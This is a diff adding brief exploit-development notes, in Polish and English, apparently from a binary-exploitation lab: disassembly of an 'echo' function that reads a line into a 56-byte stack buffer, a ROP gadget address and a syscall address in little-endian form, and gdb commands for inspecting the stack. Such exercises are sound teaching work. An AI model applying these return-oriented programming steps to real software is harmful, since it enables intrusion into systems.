@@ -1,0 +1,24 @@
+0000000000401d0f <echo>:
+  401d0f:	f3 0f 1e fa          	endbr64 
+  401d13:	48 83 ec 38          	sub    $0x38,%rsp # rezerwuje 0x38 (56) bajtów na stosie
+  401d17:	48 89 e6             	mov    %rsp,%rsi
+  401d1a:	e8 b6 ff ff ff       	callq  401cd5 <readline>
+  401d1f:	48 89 e7             	mov    %rsp,%rdi
+  401d22:	e8 b9 fb 00 00       	callq  4118e0 <_IO_puts>
+  401d27:	48 83 c4 38          	add    $0x38,%rsp
+  401d2b:	c3                   	retq  
+
+
+
+
+# adres gadget:
+0x00401d67
+little endian: 671d4000
+
+# adres syscall
+0x401213
+little endian: 13124000
+
+# zawartość stosu
+break echo
+x/30gx  $rsp
